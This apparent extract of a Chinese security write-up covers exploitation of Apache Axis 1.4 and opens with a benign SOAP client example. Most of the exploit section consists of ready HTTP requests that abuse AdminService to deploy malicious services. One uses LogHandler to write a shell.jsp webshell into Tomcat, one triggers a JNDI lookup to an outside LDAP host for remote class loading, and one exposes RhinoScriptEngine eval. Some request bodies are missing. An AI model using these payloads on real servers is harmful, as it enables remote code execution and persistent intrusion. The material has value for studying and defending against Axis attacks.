    import org.apache.axis.client.Call;
    import org.apache.axis.client.Service;
    import org.apache.axis.encoding.ser.BeanDeserializerFactory;
    import org.apache.axis.encoding.ser.BeanSerializerFactory;
    import javax.xml.namespace.QName;
    import java.util.Date;
    public class AxisClient {
        public static void main(String[] args) {
            try {
                String endpoint =
                        "http://localhost:8080/axis/services/HelloWorld?wsdl";
                Service service = new Service();
                Call call = (Call) service.createCall();
                call.setTargetEndpointAddress(new java.net.URL(endpoint));
                QName opQname = new QName("http://example", "sayHelloWorldFrom");
                call.setOperationName(opQname);
                QName helloBeanQname = new QName("urn:HelloBeanManager", "HelloBean");
                call.registerTypeMapping(HelloBean.class, helloBeanQname, new BeanSerializerFactory(HelloBean.class, helloBeanQname), new BeanDeserializerFactory(HelloBean.class, helloBeanQname));
                QName testBeanQname = new QName("urn:TestBeanManager", "TestBean");
                call.registerTypeMapping(TestBean.class, testBeanQname, new BeanSerializerFactory(TestBean.class, testBeanQname), new BeanDeserializerFactory(TestBean.class, testBeanQname));
                HelloBean helloBean = new HelloBean();
                helloBean.setStr("aaa");
                helloBean.setAnInt(111);
                helloBean.setBytes(new byte[]{1, 2, 3});
                helloBean.setDate(new Date(2021, 2, 12));
                helloBean.setTestBean(new TestBean("aaa", 111));
                String ret = (String) call.invoke(new Object[]{helloBean});
                System.out.println("Sent 'Hello!', got '" + ret + "'");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
还可以使用soap ui工具进行调用，十分方便：
可以抓包看下使用代码发送的内容，和soap ui发送的有什么不同，尽管大多数时候soap
ui能正确帮你生成可调用的soap内容，你只用填写参数，但是有的复杂类型或者不符合bean标准的参数可能还是得手动修改或者使用代码调用的方式抓包数据来进行辅助修改。
#### 1.4 Axis的利用
利用方式有以下两种：
  * 暴露在外部的web service能直接调用造成危害，web service通常会存在较多的漏洞问题，很多时候没鉴权或者鉴权不够。
  * 利用AdminService部署恶意类service或者handler，但是AdminService只能local访问，需要配合一个SSRF
第一种方式需要根据实际应用来判断，后面只写第二种方式。1.4节之前的一些内容就是为了能够理解这里利用AdminService传递部署的`
get请求：
    GET /axis/services/AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22randomBBB%22%20provider%3D%22java%3ARPC%22%3E%3CrequestFlow%3E%3Chandler%20type%3D%22java%3Aorg.apache.axis.handlers.LogHandler%22%20%3E%3Cparameter%20name%3D%22LogHandler.fileName%22%20value%3D%22..%2Fwebapps%2FROOT%2Fshell.jsp%22%20%2F%3E%3Cparameter%20name%3D%22LogHandler.writeToConsole%22%20value%3D%22false%22%20%2F%3E%3C%2Fhandler%3E%3C%2FrequestFlow%3E%3Cparameter%20name%3D%22className%22%20value%3D%22java.util.Random%22%20%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%20%2F%3E%3C%2Fservice%3E%3C%2Fdeployment HTTP/1.1
    Host: 127.0.0.1:8080
    User-Agent: Axis/1.4
    Cache-Control: no-cache
    Pragma: no-cache
通过get或post请求部署完成后，访问刚才部署的service并随意调用其中的一个方法：
    POST /axis/services/randomBBB HTTP/1.1
    Host: 127.0.0.1:8080
    Content-Type: text/xml; charset=utf-8
    Accept: application/soap+xml, application/dime, multipart/related, text/*
    User-Agent: Axis/1.4
    Cache-Control: no-cache
    Pragma: no-cache
    SOAPAction: ""
    Content-Length: 700
    ]]>
             ?
会在tomcat的webapps/ROOT/下生成一个shell.jsp文件
**缺陷：**
只有写入jsp文件时，并且目标服务器解析jsp文件时才有用，例如不让解析jsp但是解析jspx文件时，因为log中有其他垃圾信息，jspx会解析错误，所以写入jspx也是没用的
###### 1.4.1.2 org.apache.axis.client.ServiceFactory service
post请求：
    POST /axis/services/AdminService HTTP/1.1
    Host: 127.0.0.1:8080
    Connection: close
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
    Accept-Language: en-US,en;q=0.5
    SOAPAction: something
    Upgrade-Insecure-Requests: 1
    Content-Type: application/xml
    Accept-Encoding: gzip, deflate
    Content-Length: 750
get请求：
    GET /axis/services/AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22ServiceFactoryService%22%20provider%3D%22java%3ARPC%22%3E%3Cparameter%20name%3D%22className%22%20value%3D%22org.apache.axis.client.ServiceFactory%22%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%2F%3E%3C%2Fservice%3E%3C%2Fdeployment HTTP/1.1
    Host: 127.0.0.1:8080
    User-Agent: Axis/1.4
    Cache-Control: no-cache
    Pragma: no-cache
通过get或post请求部署完成后，访问刚才部署的service并调用它的getService方法，传入jndi链接即可：
    POST /axis/services/ServiceFactoryService HTTP/1.1
    Host: 127.0.0.1:8080
    Content-Type: text/xml; charset=utf-8
    Accept: application/soap+xml, application/dime, multipart/related, text/*
    User-Agent: Axis/1.4
    Cache-Control: no-cache
    Pragma: no-cache
    SOAPAction: ""
    Content-Length: 891
                   jndiName
                   ldap://xxx.xx.xx.xxx:8888/Exploit
**缺陷：** 如果设置了不允许远程加载JNDI Factory，就不能用了
###### 1.4.1.3 com.sun.script.javascript.RhinoScriptEngine service
post请求：
    POST /axis/services/AdminService HTTP/1.1
    Host: 127.0.0.1:8080
    Content-Type: text/xml; charset=utf-8
    Accept: application/soap+xml, application/dime, multipart/related, text/*
    User-Agent: Axis/1.4
    Cache-Control: no-cache
    Pragma: no-cache
    SOAPAction: ""
    Content-Length: 905
get请求：
    GET /axis/services/AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22RhinoScriptEngineService%22%20provider%3D%22java%3ARPC%22%3E%3Cparameter%20name%3D%22className%22%20value%3D%22com.sun.script.javascript.RhinoScriptEngine%22%20%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22eval%22%20%2F%3E%3CtypeMapping%20deserializer%3D%22org.apache.axis.encoding.ser.BeanDeserializerFactory%22%20type%3D%22java%3Ajavax.script.SimpleScriptContext%22%20qname%3D%22ns%3ASimpleScriptContext%22%20serializer%3D%22org.apache.axis.encoding.ser.BeanSerializerFactory%22%20xmlns%3Ans%3D%22urn%3Abeanservice%22%20regenerateElement%3D%22false%22%3E%3C%2FtypeMapping%3E%3C%2Fservice%3E%3C%2Fdeployment HTTP/1.1
    Host: 127.0.0.1:8080
    User-Agent: Axis/1.4
    Cache-Control: no-cache
    Pragma: no-cache
通过get或post请求部署完成后，访问刚才部署的service并调用它的eval方法，还可以回显：
    POST /axis/services/RhinoScriptEngineService HTTP/1.1